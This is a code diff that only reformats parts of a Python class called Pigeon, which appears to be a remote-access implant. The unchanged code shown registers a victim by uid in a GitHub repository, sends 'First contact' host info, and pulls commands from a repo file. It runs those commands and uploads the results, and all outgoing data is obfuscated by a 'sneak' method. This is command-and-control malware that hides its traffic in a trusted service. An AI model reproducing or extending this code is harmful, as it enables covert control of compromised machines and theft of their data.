@@ -43,7 +43,7 @@ class Pigeon:
         Pigeon.__repo = Github(GIT_API_KEY).get_repo(PARAM["repo"])
         info = METHODS["sneak"](info)
         Pigeon.__uid = uid
-        _, _     = Pigeon.__repo.create_file(
+        _, _ = Pigeon.__repo.create_file(
             "{}/00_info".format(uid), "First contact", info
         )
         _, _ = Pigeon.__repo.create_file(
@@ -77,7 +77,12 @@ class Pigeon:
                 continue
             for commands in cmdFile:
                 Pigeon.__commands[list(commands.keys())[0]] = list(*commands.values())
-            Pigeon.__repo.update_file("{}/00_commands".format(Pigeon.__uid), "Command recieved", "[]", fObject.sha)
+            Pigeon.__repo.update_file(
+                "{}/00_commands".format(Pigeon.__uid),
+                "Command recieved",
+                "[]",
+                fObject.sha,
+            )
 
     @staticmethod
     def __executioner() -> None:
@@ -91,7 +96,9 @@ class Pigeon:
                     Pigeon.__repo.create_file(
                         "{}/00_results/{}_{}".format(Pigeon.__uid, cmd, message),
                         "Executioner failed",
-                        METHODS["sneak"]("The {} command is not available or loaded".format(cmd))
+                        METHODS["sneak"](
+                            "The {} command is not available or loaded".format(cmd)
+                        ),
                     )
                     continue
                 if type(params) == list:
@@ -100,6 +107,6 @@ class Pigeon:
                     Pigeon.__repo.create_file(
                         "{}/00_results/{}_{}".format(Pigeon.__uid, cmd, message),
                         "Executioner push",
-                        METHODS["sneak"](result)
+                        METHODS["sneak"](result),
                     )
             Pigeon.__commands.clear()
